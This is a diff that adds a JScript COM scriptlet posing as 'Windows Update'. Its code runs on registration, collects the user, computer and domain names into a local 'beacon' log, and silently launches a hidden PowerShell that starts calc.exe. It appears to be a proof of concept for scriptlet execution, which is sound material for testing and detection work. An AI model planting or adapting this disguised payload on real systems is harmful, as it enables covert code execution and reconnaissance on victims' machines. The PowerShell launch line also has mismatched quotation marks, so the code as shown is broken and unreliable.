@@ -1,0 +1,52 @@
+<?xml version="1.0"?>
+<scriptlet>
+<registration
+    description="Windows Update"
+    progid="Update.Agent"
+    version="1.00"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
+    
+    <script language="JScript">
+        <![CDATA[
+            // All code in registration block - executes immediately
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                
+                // Collect system info
+                var username = shell.ExpandEnvironmentStrings("%USERNAME%");
+                var computername = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
+                var domain = shell.ExpandEnvironmentStrings("%USERDNSDOMAIN%");
+                
+                // Create timestamp
+                var d = new Date();
+                var timestamp = d.getFullYear() + "-" + 
+                               (d.getMonth()+1) + "-" + 
+                               d.getDate() + " " + 
+                               d.getHours() + ":" + 
+                               d.getMinutes() + ":" + 
+                               d.getSeconds();
+                
+                // Beacon
+                var beaconData = "SCROBJ_EXEC|" + username + "|" + computername + "|" + domain + "|" + timestamp;
+                var logFile = "C:\\Temp\\scriptlet-beacon.log";
+                
+                if (!fso.FolderExists("C:\\Temp")) {
+                    fso.CreateFolder("C:\\Temp");
+                }
+                
+                var file = fso.OpenTextFile(logFile, 8, true);
+                file.WriteLine(beaconData);
+                file.Close();
+                
+                // Execute calc
+               shell.Run("powershell.exe -W Hidden -NoP -C "Start-Process calc.exe"', 0, false);
+                
+            } catch(e) {
+                // Fail silently
+            }
+        ]]>
+    </script>
+</registration>
+
+</scriptlet>
